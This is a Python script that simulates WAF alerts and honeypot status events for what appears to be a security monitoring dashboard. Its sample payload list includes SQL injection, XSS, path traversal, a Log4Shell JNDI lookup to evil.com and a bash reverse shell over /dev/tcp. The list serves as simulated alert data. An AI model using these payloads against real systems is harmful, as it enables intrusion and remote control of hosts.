import asyncio
import random
import json
from datetime import datetime
from app.core.websockets import manager

async def start_simulation():
    """
    Simulates background traffic and WAF events.
    """
    print("Starting Traffic Simulation...")
    
    attack_payloads = [
        "' OR '1'='1",
        "<script>alert(1)</script>",
        "../../etc/passwd",
        "${jndi:ldap://evil.com/x}",
        "UNION SELECT 1,2,3--",
        "/bin/bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"
    ]
    
    ips = ["192.168.1.50", "10.0.0.5", "172.16.0.22", "45.33.22.11"]
    
    while True:
        # Random delay between events (5-15 seconds)
        await asyncio.sleep(random.uniform(5, 15))
        
        # 30% chance of WAF bypass alert
        # DISABLED: We now use real alerts from E-Commerce app
        # if random.random() < 0.3:
        #     event = {
        #         "type": "waf_bypass",
        #         "payload": {
        #             "source_ip": random.choice(ips),
        #             "payload": random.choice(attack_payloads),
        #             "timestamp": datetime.utcnow().isoformat(),
        #             "severity": "HIGH"
        #         },
        #         "timestamp": datetime.utcnow().isoformat()
        #     }
        #     await manager.broadcast(event)
        #     print(f"Simulated WAF Bypass: {event['payload']['payload']}")

        # 10% chance of Honeypot status change (if we had a real list, we'd pick one)
        # For now, just a generic alert
        if random.random() < 0.1:
             event = {
                "type": "system_alert",
                "payload": {
                    "message": "High CPU usage detected on honeypot-alpha",
                    "level": "WARNING"
                },
                "timestamp": datetime.utcnow().isoformat()
            }
             await manager.broadcast(event)
